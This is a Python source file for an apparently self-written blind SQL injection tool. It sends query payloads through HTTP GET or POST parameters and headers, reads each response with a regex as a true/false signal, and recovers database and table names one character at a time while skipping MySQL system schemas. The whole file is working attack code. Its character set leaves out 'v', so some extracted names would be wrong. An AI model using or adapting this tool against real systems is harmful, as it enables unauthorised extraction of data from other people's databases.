import cli_options
import json
import re
import requests
from urllib.parse import quote_plus as urlencode

NOTIN_PLACEHOLDER = 'NOTIN'
PLACEHOLDER = '{}'

chars = 'abcdefghijklmnopqrstuwxyz-_0123456789'
notin = ['information_schema', 'mysql', 'performance_schema', 'sys']


def createBruteQuery(word, query):
    queryParts = query.split(PLACEHOLDER)
    qpart2 = '' if len(queryParts) == 1 else queryParts[1]
    brutequery = queryParts[0] + word + qpart2

    return brutequery


def createWord(word, char):
    return word + char


def substitutePlaceholders(query, placeholder, notin):
    notinString = ','.join([("'" + name + "'") for name in notin])
    query = re.sub(placeholder, notinString, query)

    return query


def inPOSTrequest(payload, url, headers):
    r = requests.post(url, data=payload, headers=headers)
    return r.text


def inGETrequest(payload, url, headers):
    r = requests.get(url, params=payload, headers=headers)

    return r.text


def preparePayload(parameters, phrase, encode):
    payload = {}

    for param in parameters:

        if (re.search(PLACEHOLDER, param[1])):

            newParam = re.sub(PLACEHOLDER, phrase, param[1])

        else:
            newParam = param[1]

        payload[param[0]] = urlencode(newParam) if encode == True else newParam

    return payload


def notBruteForce(parameters, headers, phrase, url, callback, pattern, positive, encode):

    payload = preparePayload(parameters, phrase, encode)
    r = callback(payload, url, headers)
    result = pattern.search(r)

    if (positive and result) or (not positive and not result):
        message = '\n!!!\nFound: {}\n!!!\n'.format(phrase)
        print(message)


def bruteforce(parameters, headers, phrase, url, callback, pattern, positive, encode, word=''):

    for char in chars:

        newWord = createWord(word, char)
        query = substitutePlaceholders(phrase, NOTIN_PLACEHOLDER, notin)
        brutequery = createBruteQuery(newWord, query)
        payload = preparePayload(parameters, brutequery, encode)
        newHeaders = preparePayload(headers, brutequery, encode)

        r = callback(payload, url, newHeaders)
        result = pattern.search(r)

        if (positive and result) or (not positive and not result):
                return bruteforce(parameters, headers, phrase, url, callback, pattern, positive, encode, newWord)

    message = '\nFound: {}'.format(word) if word is not '' else 'Nothing found :('
    print(message)
    return word


def parseParameters(params, delimiter):
    paramsAsList = []
    if params:
        for param in params:
            paramsAsList.append([p.strip() for p in param.split(delimiter)])
    return paramsAsList


def runInjection(method, parameters, headers, phrasesToTest, url, pattern, positive, encode):

    func = notBruteForce

    for phrase in phrasesToTest:

        if not re.search(PLACEHOLDER, phrase):
            func = notBruteForce
        else:
            func = bruteforce

        phrase = phrase.rstrip('\n')
        print('Testing: {}'.format(phrase))

        try:

            if method == 'POST':
                func(parameters, headers, phrase, url, inPOSTrequest, pattern, positive, encode)

            elif method == 'GET':
                func(parameters, headers, phrase, url, inGETrequest, pattern, positive, encode)

        except:
            print("Something went wrong. Possible causes: \n1. Wrong regexp pattern\n2. Negative search pattern is actually positive search pattern\n3. You forgot about some important header")



if __name__ == "__main__":
    args = cli_options.parseArguments()
    
    jsonParsed = json.load(args.filename)

    headers = parseParameters(args.http_header, ':')
    parameters = parseParameters(args.parameter, '=')

    runInjection(args.http_method, parameters, headers, jsonParsed[args.query_set], args.url, pattern= re.compile(args.pattern), encode=args.encode, positive=args.positive)
